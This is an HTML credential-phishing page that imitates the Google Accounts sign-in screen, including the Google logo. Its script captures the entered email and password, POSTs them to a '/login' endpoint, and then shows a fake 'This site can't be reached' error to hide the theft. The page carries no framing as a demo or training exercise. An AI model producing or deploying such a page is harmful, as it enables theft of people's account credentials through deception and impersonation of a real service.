<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        /* --- GLOBAL STYLES --- */
        * { box-sizing: border-box; font-family: 'Roboto', 'Segoe UI', Tahoma, sans-serif; }
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; }

        /* --- LOGIN PAGE STYLES (White Theme) --- */
        #login-page {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #fff;
            color: #202124;
        }

        .login-card {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }

        .subtitle { font-size: 16px; margin-bottom: 40px; }

        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
        .input-group input {
            width: 100%; padding: 13px 15px; border: 1px solid #dadce0;
            border-radius: 4px; font-size: 16px; outline: none;
        }

        .btn-primary {
            background-color: #1a73e8; color: white; border: none;
            padding: 10px 24px; border-radius: 4px; font-weight: 500;
            cursor: pointer; float: right;
        }

        /* --- ERROR PAGE STYLES (Dark Theme) --- */
        #error-page {
            display: none; /* Hidden by default */
            background-color: #202124;
            color: #e8eaed;
            height: 100vh;
            width: 100vw;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0; left: 0;
        }

        .error-container { width: 90%; max-width: 460px; }
        .icon { font-size: 40px; margin-bottom: 20px; opacity: 0.6; }
        .reload-btn {
            background-color: #8ab4f8; color: #202124; padding: 10px 24px;
            border-radius: 4px; text-decoration: none; font-size: 0.85rem;
            font-weight: 500; display: inline-block;
        }

        /* --- UTILITY --- */
        .hidden { display: none !important; }
        .show-flex { display: flex !important; }
    </style>
</head>
<body>

    <div id="login-page">
        <div class="login-card">
            <div class="logo">
                <svg viewBox="0 0 74 24" width="74" height="24">
                    <path d="M7.25 14.5c-3.5 0-6.25-2.75-6.25-6.25S3.75 2 7.25 2c1.92 0 3.3.75 4.38 1.77l-1.54 1.54c-.75-.72-1.74-1.29-2.84-1.29-2.38 0-4.22 1.94-4.22 4.23s1.84 4.23 4.22 4.23c1.51 0 2.53-.61 3.09-1.16.46-.46.75-1.12.87-2.02H7.25V7.27h6.63c.06.35.1.75.1 1.2 0 2.06-.57 3.65-1.63 4.71-1.03 1.04-2.45 1.59-4.23 1.59z" fill="#4285F4"/>
                    <path d="M21.1 14.5c-2.43 0-4.38-1.87-4.38-4.25s1.95-4.25 4.38-4.25 4.38 1.87 4.38 4.25-1.95 4.25-4.38 4.25zm0-2.06c1.26 0 2.31-1.04 2.31-2.19s-1.05-2.19-2.31-2.19-2.31 1.04-2.31 2.19 1.05 2.19 2.31 2.19z" fill="#EA4335"/>
                    <path d="M30.6 14.5c-2.43 0-4.38-1.87-4.38-4.25s1.95-4.25 4.38-4.25 4.38 1.87 4.38 4.25-1.95 4.25-4.38 4.25zm0-2.06c1.26 0 2.31-1.04 2.31-2.19s-1.05-2.19-2.31-2.19-2.31 1.04-2.31 2.19 1.05 2.19 2.31 2.19z" fill="#FBBC05"/>
                    <path d="M40.05 14.5c-2.36 0-4.38-1.84-4.38-4.25s2.02-4.25 4.38-4.25c1.13 0 2.1.47 2.79 1.25V6.44h2.07v7.65c0 2.76-1.63 3.91-3.56 3.91-1.8 0-2.88-1.2-3.29-2.21l1.8-.75c.32.75.99 1.46 1.49 1.46 1.13 0 1.83-.7 1.83-2.01v-.64c-.69.83-1.66 1.34-2.79 1.34zm.21-6.44c-1.26 0-2.31 1.05-2.31 2.19s1.05 2.19 2.31 2.19 2.31-1.04 2.31-2.19-1.05-2.19-2.31-2.19z" fill="#4285F4"/>
                    <path d="M47.3 14.2V2.3h2.07v11.9H47.3z" fill="#34A853"/>
                    <path d="M56.4 14.5c-2.06 0-3.34-1.39-3.87-2.39l6.04-2.5-.21-.53c-.4-.99-1.52-2.82-3.83-2.82-2.3 0-4.22 1.82-4.22 4.25 0 2.3 1.9 4.25 4.38 4.25 1.99 0 3.14-1.22 3.62-1.93l-1.65-1.1c-.55.82-1.29 1.48-1.97 1.48s-.86-.33-1.12-.83l4.89-2.03-.17-.43c-1.11-2.73-4.17-2.73-4.17-2.73 0 0-2.04 0-2.04 2.19s2.04 2.19 2.04 2.19z" fill="#EA4335"/>
                </svg>
            </div>
            <h2>Sign in</h2>
            <p class="subtitle">Use your Google Account</p>
            
            <form id="loginForm">
                <div class="input-group">
                    <input type="email" id="email" placeholder=" " required>
                    <label for="email">Email or phone</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder=" " required>
                    <label for="password">Enter your password</label>
                </div>
                <button type="submit" class="btn-primary">Next</button>
            </form>
        </div>
    </div>

    <div id="error-page">
        <div class="error-container">
            <div class="icon">📄</div>
            <h1>This site can’t be reached</h1>
            <p><strong>127.0.0.1</strong> refused to connect.</p>
            <div style="color: #9aa0a6; font-size: 0.85rem; margin-bottom: 30px;">
                <p>Try:</p>
                <ul style="padding-left: 20px;">
                    <li>Checking the connection</li>
                    <li>Checking the proxy and the firewall</li>
                </ul>
            </div>
            <div class="actions">
                <a href="https://www.google.com" class="reload-btn">Reload</a>
                <button style="background:transparent; color:#8ab4f8; border:1px solid #5f6368; padding:9px 20px; border-radius:4px; margin-left:10px;">Details</button>
            </div>
        </div>
    </div>

    <script>
        // When the form is submitted...
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Stop the page from actually refreshing
            
            // Hide the login page
            document.getElementById('login-page').classList.add('hidden');
            
            // Show the error page
            document.getElementById('error-page').classList.add('show-flex');
        });
    </script>
	<script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        await fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });

        // Show error page after submit
        document.getElementById('login-page').classList.add('hidden');
        document.getElementById('error-page').classList.add('show-flex');
    });
</script

</body>
</html>
